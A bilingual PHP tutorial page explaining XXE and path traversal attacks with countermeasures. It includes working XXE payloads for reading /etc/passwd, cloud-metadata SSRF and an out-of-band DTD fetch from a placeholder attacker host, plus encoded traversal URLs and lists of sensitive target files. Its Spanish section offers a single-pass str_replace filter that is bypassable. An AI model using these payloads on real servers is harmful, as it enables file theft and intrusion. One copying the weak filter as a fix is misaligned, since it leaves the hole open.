<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'XXE y Path Traversal — CyberEscudo' : 'XXE & Path Traversal — CyberEscudo';
$contentTitle = $lang==='es' ? 'XXE y Path Traversal' : 'XXE & Path Traversal';
$contentDate  = '2022-05-05';
$contentTags  = ['XXE','Path Traversal','LFI','OWASP','XML'];
ob_start(); if ($lang==='es'): ?>
<div class="prose">
  <p>Explotación de vulnerabilidades <strong>XXE</strong> (XML External Entities) y <strong>Path Traversal</strong>, con sus respectivas contramedidas.</p>

  <h2>1. XXE — XML External Entities</h2>
  <p>Ocurre cuando una aplicación procesa XML controlado por el usuario y el parser tiene habilitadas las entidades externas DTD. Permite leer archivos del sistema, SSRF y en casos avanzados, RCE.</p>

  <h3>Payload básico — leer /etc/passwd</h3>
  <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;
  &lt;data&gt;&amp;xxe;&lt;/data&gt;
&lt;/root&gt;</code></pre>

  <h3>XXE para SSRF — petición interna</h3>
  <pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>

  <h3>XXE out-of-band (blind)</h3>
  <pre><code>&lt;!DOCTYPE foo [
  &lt;!ENTITY % remote SYSTEM "http://atacante.com/evil.dtd"&gt;
  %remote;
]&gt;</code></pre>

  <h3>Contramedidas XXE</h3>
  <pre><code>&lt;?php
// Deshabilitar entidades externas en PHP:
libxml_disable_entity_loader(true);

// En Java:
// DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);

// Validar y sanitizar todo XML de entrada
// Usar formatos alternativos (JSON) cuando sea posible</code></pre>

  <h2>2. Path Traversal (Directory Traversal)</h2>
  <p>Permite acceder a archivos fuera del directorio permitido usando secuencias <code>../</code> para navegar la estructura de directorios del servidor.</p>

  <h3>Explotación básica</h3>
  <pre><code># En parámetros de URL que incluyen archivos:
http://target.com/download?file=../../../etc/passwd
http://target.com/view?page=../../../../windows/win.ini

# Con codificación URL para evadir filtros básicos:
http://target.com/file?name=..%2F..%2F..%2Fetc%2Fpasswd

# Con doble codificación:
http://target.com/file?name=..%252F..%252F..%252Fetc%252Fpasswd

# Con null byte (PHP < 5.3):
http://target.com/file?name=../../../etc/passwd%00.jpg</code></pre>

  <h3>Archivos objetivo comunes</h3>
  <pre><code># Linux:
../../../etc/passwd          # Usuarios del sistema
../../../etc/shadow          # Hashes de contraseñas
../../../etc/hosts           # Resolución DNS local
../../../proc/self/environ   # Variables de entorno del proceso
../../../var/log/apache2/access.log  # Logs de Apache

# Windows:
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts</code></pre>

  <h3>Contramedidas Path Traversal</h3>
  <pre><code>&lt;?php
// 1. Usar realpath() y verificar que el archivo está en el directorio permitido:
$base_dir = '/var/www/files/';
$file = $_GET['file'];
$real_path = realpath($base_dir . $file);

if ($real_path === false || strpos($real_path, $base_dir) !== 0) {
    http_response_code(403);
    die('Acceso denegado');
}
readfile($real_path);

// 2. Lista blanca de archivos permitidos:
$allowed = ['manual.pdf', 'guia.pdf', 'catalogo.pdf'];
if (!in_array($file, $allowed)) {
    die('Archivo no permitido');
}

// 3. Eliminar secuencias peligrosas:
$file = str_replace(['../', '..\\', '../', '..\\'], '', $_GET['file']);
?&gt;</code></pre>
</div>
<?php else: ?>
<div class="prose">
  <p>Exploitation of <strong>XXE</strong> (XML External Entities) and <strong>Path Traversal</strong> vulnerabilities, with countermeasures for each.</p>

  <h2>1. XXE — XML External Entities</h2>
  <p>Occurs when a user-controlled XML document is parsed with external DTD entities enabled. Allows reading server files, SSRF, and potentially RCE.</p>

  <h3>Basic payload — read /etc/passwd</h3>
  <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;</code></pre>

  <h3>XXE for SSRF</h3>
  <pre><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>

  <h3>XXE Countermeasures</h3>
  <pre><code>&lt;?php
libxml_disable_entity_loader(true);
// Use JSON instead of XML when possible
?&gt;</code></pre>

  <h2>2. Path Traversal</h2>
  <p>Accesses files outside the permitted directory using <code>../</code> sequences.</p>

  <h3>Exploitation</h3>
  <pre><code">http://target.com/download?file=../../../etc/passwd
http://target.com/file?name=..%2F..%2F..%2Fetc%2Fpasswd   # URL encoded</code></pre>

  <h3>Common targets (Linux)</h3>
  <pre><code">../../../etc/passwd           # System users
../../../etc/shadow           # Password hashes
../../../proc/self/environ    # Process environment
../../../var/log/apache2/access.log  # Apache logs</code></pre>

  <h3>Path Traversal Countermeasures</h3>
  <pre><code>&lt;?php
$base = '/var/www/files/';
$real = realpath($base . $_GET['file']);
if ($real === false || strpos($real, $base) !== 0) {
    http_response_code(403); die('Access denied');
}
readfile($real);
?&gt;</code></pre>
</div>
<?php endif; $contentBody=ob_get_clean(); require __DIR__.'/../templates/content-page.php';
